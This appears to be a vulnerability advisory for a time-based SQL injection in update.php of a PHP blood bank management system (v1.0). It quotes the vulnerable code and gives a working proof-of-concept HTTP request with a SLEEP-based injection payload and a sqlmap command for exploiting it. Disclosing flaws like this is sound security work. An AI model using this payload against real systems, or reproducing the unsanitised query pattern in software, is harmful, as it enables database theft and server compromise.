# blood-bank-system-in-php update.php $name

[Blood Bank System In PHP With Source Code - Source Code & Projects (code-projects.org)](https://code-projects.org/blood-bank-system-in-php-with-source-code/)

## NAME OF AFFECTED PRODUCT(S)

**blood-bank-system-in-php**

## Vendor Homepage

https://code-projects.org/blood-bank-system-in-php-with-source-code/

##  **Manufacturers sites**

https://code-projects.org/

## AFFECTED  VERSION(S)

### Vulnerable File

update.php $name parameter.

### VERSION(S)

-  v1.0

### Software Link

https://download.code-projects.org/details/09f1f26e-072d-4fec-bd3b-974076ee162c

## PROBLEM TYPE

network remote attack.

## Vulnerability Type

remote network time sql injection .  

## Root Cause

In update.php , SQL injection is used to obtain database information or getShell via $name parameter.

## Impact

## **Description of the vulnerability**

### update.php

In update.php，the    $name parameter is not filtered and concatenated into the SQL statement.        

```
<?php
session_start();

$con= mysqli_connect('localhost', 'root', 'root');
mysqli_select_db($con,'bloodbank');
$name=$_POST['name'];
$email=$_POST['email'];
$city=$_POST['city'];
$blood=$_POST['blood'];
$mobile=$_POST['mobile'];
$s = "select * from userdetail where name= '$name";
```

​                                                                                                                                                                                                                                                                                                                                                                                         

![image-20241009234224851](https://github.com/user-attachments/assets/7150e583-3686-4ff6-b1a0-b0c5b4f59843)

## **Vulnerability recurrence**

### **POC**

```
POST /update.php HTTP/1.1
Host: bloodbankmgmtsystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Origin: http://bloodbankmgmtsystem
Connection: close
Referer: http://bloodbankmgmtsystem/update.php
Cookie: PHPSESSID=7nrs3h9tnqiosb90cj21sji60c
Upgrade-Insecure-Requests: 1
Priority: u=0, i

name=1' AND (SELECT 2529 FROM (SELECT(SLEEP(5)))BseP) AND 'Ggnf'='Ggnf
```

save it as 1.txt

excute the command.

```
python sqlmap.py -r "1.txt"
```

result

![image-20241009234339974](https://github.com/user-attachments/assets/773acbd0-df21-49ef-ab70-261595dda734)